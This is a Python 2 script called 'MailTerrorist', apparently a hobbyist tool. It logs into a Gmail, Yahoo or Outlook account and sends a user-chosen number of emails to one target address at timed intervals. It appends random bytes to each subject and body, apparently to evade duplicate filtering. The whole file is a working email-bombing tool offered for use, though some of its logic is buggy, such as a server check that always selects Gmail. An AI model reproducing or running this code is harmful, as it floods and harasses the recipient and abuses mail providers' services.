#!/usr/bin/python

# MailTerrorist

import os
import smtplib
import getpass
import sys
import time

print """
   *
 (  `     (         (   *   )                                     )
 )\))(    )\    (   )\` )  /(   (   (    (         (   (       ( /(
((_)()\((((_)(  )\ ((_)( )(_)) ))\  )(   )(    (   )(  )\  (   )\())
(_()((_))\ _ )\((_) _ (_(_()) /((_)(()\ (()\   )\ (()\((_) )\ (_))/
|  \/  |(_)_\(_)(_)| ||_   _|(_))   ((_) ((_) ((_) ((_)(_)((_)| |_
| |\/| | / _ \  | || |  | |  / -_) | '_|| '_|/ _ \| '_|| |(_-<|  _|
|_|  |_|/_/ \_\ |_||_|  |_|  \___| |_|  |_|  \___/|_|  |_|/__/ \__|


[?] Script by: Peroh

"""

def isEmpty(string):
    if not string:
        print("\nInvalid input: string is empty\n")
        return True
    else:
        return False

def getInput(msg):
    while True:
        inp = raw_input(msg)
        if isEmpty(inp): continue
        else: break
    return inp

server = getInput('[>] Mail server:\n 1 - Gmail\n 2 - Yahoo\n 3 - Outlook\n\n> ')
user = getInput('\nEmail: ')
passwd = getpass.getpass('Password: ')


to = getInput('\nTo: ')
subject = getInput('Subject: ')
body = getInput('Message: ')
emails = getInput('Number of emails to send: ')
interval = getInput('Interval between messages: ')
random = getInput('Number of random characters: ')
print('\n')

if server.lower() == 'gmail' or '1':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server.lower() == 'yahoo' or '2':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
elif server.lower() == 'outlook' or '3':
    smtp_server = 'smtp-mail.outlook.com'
    port = 587
else:
    print "[-] Invalid mail server"
    print '[!] Check your input for typos'
    sys.exit(3)

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com" or smtp_server == "smtp-mail.outlook.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, int(emails)+1):
        subject = subject + ' ' + os.urandom(int(random/2))
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n\n' + body + ' ' + os.urandom(int(random)) + '\n' + os.urandom(int(random)) 
        server.sendmail(user,to,msg)
        print "[+] E-mails sent: %i" % i
	time.sleep(float(interval))
    server.quit()
    print '\n[=] Done'
    sys.exit(0)
except KeyboardInterrupt:
    print '[-] Canceled (KeyboardInterrupt)'
    sys.exit(1)
except smtplib.SMTPAuthenticationError:
    print '\n[-] Could not authenticate account (Authentication error)'
    print '[!] Your username or password could have a typo, please try again'
    print '[!] Allow access to less secure apps on your gmail account in: https://www.google.com/settings/security/lesssecureapps'
    sys.exit(2)
except smtplib.SMTPDataError:
    print '\n[-] Mail server refused the data (Data error)'
    print '[!] Check your input for illegal characters'
    print '[!] Check if your message or subject exceeds the character limit'
    sys.exit(4)
except smtplib.SMTPHeloError:
    print('\n[-] The server refused the HELO message (Helo error)')
    sys.exit(5)
